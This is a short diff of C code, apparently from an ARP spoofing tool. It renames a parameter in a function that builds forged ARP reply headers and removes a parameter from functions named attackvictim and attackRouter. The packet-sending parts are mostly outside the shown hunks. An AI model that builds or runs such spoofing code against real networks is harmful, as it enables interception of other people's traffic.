@@ -1,15 +1,15 @@
 #include "myHeader.h"
 
-int setArpHeader(PARP_HEADER arpHeader)
+int setArpHeader(PARP_HEADER ah)
 {
-	arpHeader->Hardware_type = ntohs(0x0001);
-	arpHeader->Protocol_type = ntohs(0x0800);
-	arpHeader->Hardware_size = 0x06;
-	arpHeader->Protocol_size = 0x04;
-	arpHeader->Opcode = ntohs(REPLY);
+	ah->Hardware_type = ntohs(0x0001);
+	ah->Protocol_type = ntohs(0x0800);
+	ah->Hardware_size = 0x06;
+	ah->Protocol_size = 0x04;
+	ah->Opcode = ntohs(REPLY);
 	return 0;
 }
-int attackvictim(pcap_t* handle, PARP_PACKET arpPacket, PLANINFO LanInfo)
+int attackvictim(pcap_t* handle, PARP_PACKET arpPacket)
 {
 	u_char packet[ARP_PACKET_SIZE];
 	/* set header */
@@ -30,7 +30,7 @@ int attackvictim(pcap_t* handle, PARP_PACKET arpPacket, PLANINFO LanInfo)
 	}
 	return 0;
 }
-int attackRouter(pcap_t* handle, PARP_PACKET arpPacket, PLANINFO LanInfo)
+int attackRouter(pcap_t* handle, PARP_PACKET arpPacket)
 {
 	u_char packet[ARP_PACKET_SIZE];
 	/* set header */
